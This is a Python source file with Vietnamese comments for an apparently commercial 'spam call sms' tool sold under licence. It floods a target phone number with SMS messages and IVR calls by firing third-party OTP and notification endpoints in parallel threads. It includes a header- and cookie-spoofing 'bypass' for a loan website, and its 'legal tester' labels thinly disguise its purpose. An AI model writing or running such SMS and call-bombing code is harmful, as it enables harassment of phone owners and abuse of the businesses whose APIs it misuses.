import os
import sys
import json
import time
import hashlib
import platform
import subprocess
import logging
from typing import Dict, List, Any
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ==========================================
# CẤU HÌNH HỆ THỐNG & LICENSE
# ==========================================
SERVER_URL = "https://shopvietx.io.vn/api/license"
TOOL_NAME = "spam call sms"
KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")
CONFIG_FILE_PATH = "apis_config.json"

# Bật True để xem chi tiết Request/Response (Debug Mode)
DEBUG_MODE = False 

# ==========================================
# CẤU HÌNH LOGGING
# ==========================================
log_level = logging.DEBUG if DEBUG_MODE else logging.INFO
logging.basicConfig(
    level=log_level,
    format="%(asctime)s %(message)s",
    datefmt="[%H:%M:%S]",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("MatrixCloudEngine")

class CloudTestingEngine:
    def __init__(self):
        self.timeout = 10 
        self.api_database = self.load_config()

    def load_config(self) -> Dict[str, List[Any]]:
        """Đọc danh sách API từ file JSON cục bộ, giúp dễ dàng thêm/xóa không cần sửa code"""
        if not os.path.exists(CONFIG_FILE_PATH):
            logger.error(f"[-] Lỗi: Không tìm thấy file cấu hình '{CONFIG_FILE_PATH}'.")
            return {"sms_endpoints": [], "call_endpoints": []}
            
        try:
            with open(CONFIG_FILE_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
                logger.info(f"[+] Đã tải cấu hình: {len(data.get('sms_endpoints', []))} SMS, {len(data.get('call_endpoints', []))} Call.")
                return data
        except Exception as e:
            logger.error(f"[-] Lỗi đọc file JSON: {str(e)}")
            return {"sms_endpoints": [], "call_endpoints": []}

    def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
        """Worker xử lý độc lập từng API với Session riêng biệt, Retry tự động và Timeout"""
        name = api.get("name", "Dịch vụ ẩn danh")
        url = api.get("url")
        method = api.get("method", "POST").upper()
        headers = api.get("headers", {}).copy()
        
        # 1. Khởi tạo Session kèm cơ chế tự động Retry khi lỗi mạng
        worker_session = requests.Session()
        retries = Retry(
            total=2, # Tự động thử lại 2 lần nếu gặp lỗi mạng
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504],
            raise_on_status=False
        )
        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=retries)
        worker_session.mount("http://", adapter)
        worker_session.mount("https://", adapter)

        # 2. Xử lý logic đặc biệt cho Call IVR (VayXanh Bypass)
        if url and "vayxanh" in url.lower():
            headers.update({
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'vi-VN',
                'origin': 'https://lk.vayxanh.com',
                'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin'
            })
            worker_session.headers.update(headers)
            try:
                logger.debug(f"[{name}] Đang khởi tạo phiên Cookie...")
                worker_session.get(f"https://lk.vayxanh.com/?phone={phone}", timeout=self.timeout)
                if "_cabinet_key" not in requests.utils.dict_from_cookiejar(worker_session.cookies):
                    worker_session.get("https://lk.vayxanh.com/internal/client/config", timeout=self.timeout)
            except Exception as e:
                logger.debug(f"[{name}] Lỗi khởi tạo phiên: {e}")
        else:
            worker_session.headers.update(headers)
        
        # 3. Chuẩn bị định dạng số điện thoại và Payload
        phone_no_zero = phone[1:] if phone.startswith("0") else phone
        phone_84 = "84" + phone_no_zero
        raw_template = api.get("payload_template", "")
        formatted_payload = raw_template.replace("{phone}", phone)\
                                      .replace("{phone_no_zero}", phone_no_zero)\
                                      .replace("{phone_84}", phone_84)

        try:
            request_kwargs = {"json": json.loads(formatted_payload)} if api.get("is_json") else {"data": formatted_payload}

            logger.info(f"[▶ RUNNING] Đang kiểm thử cổng: {name}")
            
            # Thực thi Request
            response = worker_session.request(
                method=method,
                url=url,
                timeout=self.timeout,
                **request_kwargs
            )
            
            if DEBUG_MODE:
                logger.debug(f"[{name}] HTTP {response.status_code} | Response: {response.text[:200]}")

            if response.status_code == 200:
                logger.info(f"  └── [✓ SUCCESS] {name} thành công.")
                return True
            else:
                logger.info(f"  └── [✕ FAILED] {name} phản hồi không chuẩn (Mã: {response.status_code}).")
                return False

        except requests.exceptions.Timeout:
            logger.info(f"  └── [🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.")
        except Exception as e:
            logger.info(f"  └── [✕ ERROR] Không thể kết nối tới {name}.")
            if DEBUG_MODE:
                logger.error(f"Chi tiết lỗi {name}: {str(e)}")
        finally:
            worker_session.close() # Giải phóng bộ nhớ của Session
        
        return False

    def trigger_sms_suite(self, phone: str) -> None:
        """Kích hoạt kiểm thử toàn bộ API SMS qua luồng song song"""
        sms_list = self.api_database.get("sms_endpoints", [])
        if not sms_list:
            print("[-] Không có cấu hình SMS nào để chạy.")
            return

        print(f"\n[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...")
        print("-" * 55)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in sms_list]
            concurrent.futures.wait(futures) # Đợi tất cả SMS hoàn thành
            
        print("-" * 55)
        print("[✓] Hoàn tất Suite SMS.")

    def trigger_combined_suite(self, phone: str) -> None:
        """Kịch bản tích hợp: Bắt buộc chạy xong SMS mới kích hoạt Call ở cuối luồng"""
        # Bước 1: Chạy toàn bộ SMS
        self.trigger_sms_suite(phone)
        
        time.sleep(2) # Nghỉ nhịp trước khi gọi Call
        
        # Bước 2: Chạy các API Call ở cuối luồng
        call_list = self.api_database.get("call_endpoints", [])
        if not call_list:
            return

        print(f"\n[+] Khởi chạy Suite IVR (Call): Đang thực thi {len(call_list)} cuộc gọi thoại...")
        print("-" * 55)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in call_list]
            concurrent.futures.wait(futures)
            
        print("-" * 55)
        print("[✓] Hoàn tất toàn bộ chuỗi tích hợp (SMS + Call).")


# ==========================================
# CÁC HÀM TRỢ GIÚP: MÃ MÁY & CHECK LICENSE
# ==========================================
def get_hardware_id() -> str:
    """Định danh phần cứng duy nhất"""
    current_os = platform.system().lower()
    raw_id = "UNKNOWN_DEVICE"
    try:
        if current_os == "windows":
            cmd = "wmic csproduct get uuid"
            output = subprocess.check_output(cmd, shell=True).decode().split()
            if len(output) >= 2: raw_id = output[1]
        elif current_os == "linux":
            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
                if os.path.exists(path):
                    with open(path, "r") as f:
                        raw_id = f.read().strip()
                    break
    except Exception:
        pass
    return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()


def verify_license_key(key: str, hardware_id: str) -> bool:
    """Xác thực Key với Server"""
    try:
        payload = {"license_key": key, "hwid": hardware_id, "tool": TOOL_NAME}
        response = requests.post(SERVER_URL, json=payload, timeout=8)
        if response.status_code == 200:
            res_data = response.json()
            if res_data.get("status") == "success" or res_data.get("active") is True:
                return True
    except Exception:
        pass
    return False


def check_authentication_flow():
    """Luồng chặn xác thực bản quyền"""
    hw_id = get_hardware_id()
    if os.path.exists(KEY_FILE_PATH):
        with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
            if verify_license_key(f.read().strip(), hw_id):
                return True 
            
    while True:
        os.system("cls" if platform.system().lower() == "windows" else "clear")
        print("=" * 64)
        print("         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       ")
        print("=" * 64)
        print(f"  [!] Trạng thái: Chưa kích hoạt bản quyền!")
        print(f"  • Mã máy (HWID): {hw_id}")
        print("  • Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.")
        print("-" * 64)
        
        user_key = input("[?] Nhập Key bản quyền (Hoặc '0' để thoát): ").strip()
        if user_key == "0": sys.exit(0)
        if not user_key: continue
            
        print("[+] Đang kiểm tra mã khóa...")
        if verify_license_key(user_key, hw_id):
            with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
                f.write(user_key)
            print("[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...")
            time.sleep(1.5)
            return True
        else:
            print("[-] Lỗi: Key không hợp lệ hoặc không dùng cho máy này!")
            input("\n[Nhấn Enter để thử lại...]")


def show_banner_introduction():
    os.system("cls" if platform.system().lower() == "windows" else "clear")
    print("=" * 64)
    print("         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          ")
    print("   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) ")
    print("=" * 64)
    print(f"  • Phiên bản: Legal Tester v4.0")
    print(f"  • Mã máy: {get_hardware_id()}")
    print(f"  • Trạng thái bản quyền: Đã kích hoạt [✓]")
    print(f"  • Debug Mode: {'BẬT' if DEBUG_MODE else 'TẮT'}")
    print("=" * 64)


def render_terminal_menu():
    print("\n" + "═"*20 + " MENU ĐIỀU KHIỂN CHÍNH " + "═"*20)
    print("  [1] Chỉ spam SMS (SMS Only)")
    print("  [2] Chạy toàn diện (SMS + Call)")
    print("  [0] Thoát chương trình")
    print("═"*64)


def run_application():
    check_authentication_flow()
    show_banner_introduction()
    core_engine = CloudTestingEngine()
    
    while True:
        render_terminal_menu()
        cmd = input("[?] Nhập tùy chọn (0-2): ").strip()
        
        if cmd == "0":
            print("[+] Đóng hệ thống!")
            break
        elif cmd in ["1", "2"]:
            phone = input("[?] Nhập số điện thoại cần test (Đã được cấp phép): ").strip()
            if not phone or len(phone) < 9 or not phone.isdigit():
                print("[-] Lỗi: Số điện thoại không hợp lệ!")
                continue
                
            if cmd == "1":
                core_engine.trigger_sms_suite(phone)
            elif cmd == "2":
                core_engine.trigger_combined_suite(phone)
                
            input("\n[Nhấn nút Enter để tiếp tục...]")
        else:
            print("[-] Mã lệnh không hợp lệ!")

if __name__ == "__main__":
    run_application()
